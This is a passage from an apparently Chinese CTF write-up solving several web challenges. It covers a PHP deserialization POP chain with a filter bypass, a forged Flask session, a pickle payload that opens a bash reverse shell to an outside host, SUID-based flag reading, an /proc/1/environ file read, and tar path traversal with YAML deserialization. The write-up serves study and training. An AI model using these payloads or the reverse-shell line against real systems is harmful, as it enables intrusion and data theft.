language_">$this</span>-&gt;finish-&gt;finish) &#123;</span><br><span class="line">                <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;now[<span class="variable">$name</span>], <span class="variable">$ary</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ycb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;now = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;finish-&gt;finish;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$finish</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;name[<span class="variable">$value</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;CTF-&gt;<span class="title function_ invoke__">ycb</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fine-&gt;<span class="title function_ invoke__">YCB1</span>(<span class="variable">$this</span>-&gt;rce, <span class="variable">$this</span>-&gt;rce1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prohib</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&quot;CTF&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">  <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">prohib</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>分析源码，能够知道可以利用<code>Yang</code>这个类的<code>__call</code>来rce。</p></li><li><p>poc:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$ary</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__call1&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="literal">true</span> || <span class="variable language_">$this</span>-&gt;finish1-&gt;name) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__call2&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;finish-&gt;finish) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;__call3&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//var_dump($name);</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$ary</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;now[<span class="variable">$name</span>], <span class="variable">$ary</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ycb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;now = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;finish-&gt;finish;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$finish</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;name[<span class="variable">$value</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//echo $this-&gt;rce.&quot;&lt;br&gt;&quot;;</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;CTF-&gt;<span class="title function_ invoke__">ycb</span>()) &#123;</span><br><span class="line"><span class="comment">//echo $this-&gt;rce.&quot;&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fine-&gt;<span class="title function_ invoke__">YCB1</span>(<span class="variable">$this</span>-&gt;rce, <span class="variable">$this</span>-&gt;rce1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Bei</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;rce=<span class="string">&quot;cat /tmp/catcatf1ag.txt&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;rce1=<span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;CTF=<span class="keyword">new</span> <span class="title class_">Yang</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;CTF-&gt;finish=<span class="keyword">new</span> <span class="title class_">Yang</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;CTF-&gt;finish-&gt;finish=<span class="literal">true</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;fine=<span class="keyword">new</span> <span class="title class_">Yang</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fine-&gt;now[<span class="string">&quot;YCB1&quot;</span>]=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;fine-&gt;finish=<span class="keyword">new</span> <span class="title class_">Yang</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fine-&gt;finish-&gt;finish=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:3:&quot;Bei&quot;:4:&#123;s:3:&quot;rce&quot;;s:23:&quot;cat /tmp/catcatf1ag.txt&quot;;s:4:&quot;rce1&quot;;s:3:&quot;123&quot;;s:3:&quot;CTF&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;b:1;&#125;&#125;s:4:&quot;fine&quot;;O:4:&quot;Yang&quot;:2:&#123;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;system&quot;;&#125;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;b:1;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>之后将<code>system</code>双写，即可绕过<code>prohib</code>。</p></li><li><p>最后的payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTF=O:3:&quot;Bei&quot;:4:&#123;s:3:&quot;rce&quot;;s:23:&quot;cat /tmp/catcatf1ag.txt&quot;;s:4:&quot;rce1&quot;;s:3:&quot;123&quot;;s:3:&quot;CTF&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;b:1;&#125;&#125;s:4:&quot;fine&quot;;O:4:&quot;Yang&quot;:2:&#123;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;syssystemtem&quot;;&#125;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;b:1;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web1_2.png"></p></li></ol><h2 id="Serpent"><a href="#Serpent" class="headerlink" title="Serpent"></a>Serpent</h2><ol><li><p>访问<code>www.zip</code>，得到源码。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#源码</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/verification&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verification</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        attribute = session.get(<span class="string">&#x27;Attribute&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(attribute, <span class="built_in">dict</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Hacker!!!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> attribute.get(<span class="string">&#x27;name&#x27;</span>) == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> attribute.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> secret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Don&#x27;t play tricks on me&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You are a perfect stranger to me&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>抓包，在响应包里看到session，解码得到<code>secret_key</code>为<code>GWHTpNTlRMDw6p</code>。</p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web2_1.png"></p></li><li><p>伪造session，让<code>admin</code>为1，<code>name</code>为<code>admin</code>，访问<code>/verification</code>,即可得到下一步提示。</p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web2_2.png"></p></li><li><p>访问<code>/ppppppppppick1e</code>，在响应头看到<code>Hint: Source in /src0de</code>。</p></li><li><p>访问<code>/src0de</code>，得到源码，可以发现这是<code>pickle反序列化</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#源码</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src0de&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src0de</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    rsp = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> rsp[rsp.index(<span class="string">&quot;@app.route(&#x27;/src0de&#x27;)&quot;</span>):]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ppppppppppick1e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ppppppppppick1e</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">        rsp = make_response(<span class="string">&quot;Hello, %s &quot;</span> % username)</span><br><span class="line">        rsp.headers[<span class="string">&#x27;hint&#x27;</span>] = <span class="string">&quot;Source in /src0de&quot;</span></span><br><span class="line">        pick1e = request.cookies.get(<span class="string">&#x27;pick1e&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> pick1e <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            pick1e = base64.b64decode(pick1e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> rsp</span><br><span class="line">        <span class="keyword">if</span> check(pick1e):</span><br><span class="line">            pick1e = pickle.loads(pick1e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Go for it!!!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No Way!!!&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_message = <span class="built_in">str</span>(e)</span><br><span class="line">        <span class="keyword">return</span> error_message</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rsp</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GWHT</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure></li><li><p>经过测试，过滤了<code>R</code>，因此R指令不可用，我们使用C指令来反弹shell。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">b=<span class="string">b&quot;\x80\x03c__main__\nGWHT\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVbash -c \&#x27;bash -i &gt;&amp; /dev/tcp/7654du6216.zicp.fun/33699 0&gt;&amp;1\&#x27;\nb.&quot;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br><span class="line"><span class="comment">#b&#x27;gANjX19tYWluX18KR1dIVAopgX0oVl9fc2V0c3RhdGVfXwpjb3MKc3lzdGVtCnViVmJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvNzY1NGR1NjIxNi56aWNwLmZ1bi8zMzY5OSAwPiYxJwpiLg==&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web2_4.png"></p></li><li><p>成功反弹shell，在根目录发现flag，但没有权限读取。</p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web2_3.png"></p></li><li><p>用find命令查找具有<code>SUID</code>权限的程序，发现python具有这个权限。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web2_5.png"></p></li><li><p>最后用python来读取flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;print(open(&quot;/flag&quot;).read())&#x27;</span><br></pre></td></tr></table></figure><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web2_6.png"></p></li></ol><h2 id="ArkNights"><a href="#ArkNights" class="headerlink" title="ArkNights"></a>ArkNights</h2><ol><li><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] =<span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;*&quot;</span>)+<span class="string">&quot;Boogipopisweak&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name=request.args.get(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;name&quot;</span>)</span><br><span class="line">    m1sery=[request.args.get(<span class="string">&quot;m1sery&quot;</span>,<span class="string">&quot;Doctor.Boogipop&quot;</span>)]</span><br><span class="line">    <span class="keyword">if</span>(session.get(<span class="string">&quot;name&quot;</span>)==<span class="string">&quot;Dr.Boog1pop&quot;</span>):</span><br><span class="line">        blacklist=re.findall(<span class="string">&quot;/ba|sh|\\\\|\[|]|#|system|&#x27;|\&quot;/&quot;</span>, name, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;bad hacker no way&quot;</span></span><br><span class="line">        <span class="built_in">exec</span>(<span class="string">f&#x27;for [<span class="subst">&#123;name&#125;</span>] in [<span class="subst">&#123;m1sery&#125;</span>]:print(&quot;strange?&quot;)&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;Doctor&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,name=session.get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">        file = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">        fileblacklist=re.findall(<span class="string">&quot;/flag|fl|ag/&quot;</span>,file, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> fileblacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;bad hacker!&quot;</span></span><br><span class="line">        start=request.args.get(<span class="string">&quot;start&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        end=request.args.get(<span class="string">&quot;end&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> start==<span class="string">&quot;0&quot;</span> <span class="keyword">and</span> end==<span class="string">&quot;0&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">open</span>(file,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            start,end=<span class="built_in">int</span>(start),<span class="built_in">int</span>(end)</span><br><span class="line">            f=<span class="built_in">open</span>(file,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">            f.seek(start)</span><br><span class="line">            data=f.read(end)</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="built_in">print</span>(os.path.pardir)</span><br><span class="line">    <span class="built_in">print</span>(path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>存在非预期，用read路由直接读<code>/proc/1/environ</code>，直接得到flag。</p></li></ol><h2 id="ezyaml"><a href="#ezyaml" class="headerlink" title="ezyaml"></a>ezyaml</h2><p>yaml的反序列化+tar的路径穿越。</p><ol><li><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;bytes&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;map&#x27;</span>,<span class="string">&#x27;frozenset&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;tuple&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;object&#x27;</span>,<span class="string">&#x27;listitems&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;object&#x27;</span>,<span class="string">&#x27;apply&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> <span class="built_in">str</span>(s).lower():</span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extractFile</span>(<span class="params">filepath, <span class="built_in">type</span></span>):</span><br><span class="line"></span><br><span class="line">    extractdir = filepath.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(extractdir):</span><br><span class="line">        os.makedirs(extractdir)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&#x27;tar&#x27;</span>:</span><br><span class="line">        tf = tarfile.TarFile(filepath)</span><br><span class="line">        tf.extractall(extractdir)</span><br><span class="line">        <span class="keyword">return</span> tf.getnames()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">        fn = <span class="string">&#x27;uploads/&#x27;</span> + md5().hexdigest()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fn):</span><br><span class="line">            os.makedirs(fn)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        upFile = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(upFile)</span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">r&quot;\.\.|/&quot;</span>, upFile.filename, re.M|re.I) != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Hacker!&#x27;);window.location.href=&#x27;/upload&#x27;&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">        savePath = <span class="string">f&quot;uploads/<span class="subst">&#123;upFile.filename&#125;</span>&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(savePath)</span><br><span class="line">        upFile.save(savePath)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> tarfile.is_tarfile(savePath):</span><br><span class="line">            zipDatas = extractFile(savePath, <span class="string">&#x27;tar&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;result.html&#x27;</span>, path=savePath, files=zipDatas)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;upFile.filename&#125;</span> upload successfully&#x27;);history.back(-1);&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args:</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;config/<span class="subst">&#123;username&#125;</span>.yaml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            Config = yaml.load(f.read())</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, username=<span class="string">&quot;admin&quot;</span>, message=<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure></li><li><p>分析源码，发现当上传文件为<code>tar</code>时，会进行一个解压操作，于是想到tar路径穿越。</p></li><li><p>在<code>/src</code>路由，可以发现对<code>config</code>目录下的文件进行一个yaml的反序列化操作，于是在文件内写入exp，利用curl+dnslog实现命令外带（反弹shell不成功）。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 